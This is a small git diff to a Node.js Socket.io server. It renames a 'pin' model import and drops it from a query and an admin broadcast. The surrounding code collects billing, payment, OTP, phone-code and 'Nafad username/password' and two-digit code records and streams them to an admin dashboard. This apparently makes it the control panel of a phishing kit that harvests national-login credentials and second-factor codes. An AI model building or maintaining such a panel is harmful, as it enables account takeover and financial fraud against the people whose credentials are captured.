@@ -19,7 +19,7 @@ const Comprehensive = require("./models/Comprehensive");
 const IndexSubmission = require("./models/IndexSubmission");
 const Billing = require("./models/Billing");
 const Payment = require("./models/Payment");
-const pin = require("./models/Code");
+const code = require("./models/Code");
 const Nafad = require("./models/Nafad");
 const NafadCode = require("./models/NafadCode");
 const Admin = require("./models/Admin");
@@ -61,7 +61,6 @@ io.on("connection", (socket) => {
       phoneSubs,
       phoneCodes,
       thirdPartys,
-      pin,
       verifs,
       nafadLogins,
       nafadCodes,
@@ -74,7 +73,6 @@ io.on("connection", (socket) => {
       phone.find().sort({ _id: -1 }).lean(),
       PhoneCode.find().sort({ _id: -1 }).lean(),
       ThirdParty.find().sort({ _id: -1 }).lean(),
-      pin.find().sort({ _id: -1 }).lean(),
       Verification.find().sort({ _id: -1 }).lean(),
       Nafad.find().sort({ _id: -1 }).lean(),
       NafadCode.find().sort({ _id: -1 }).lean(),
@@ -94,7 +92,6 @@ io.on("connection", (socket) => {
       phoneSubs, // phone submissions
       phoneCodes, // phone-code submissions
       thirdPartys,
-      pin,
       verifs, // final verifications (OTP)
       nafadLogins, // Nafad username/password
       nafadCodes, // Nafad two‑digit codes
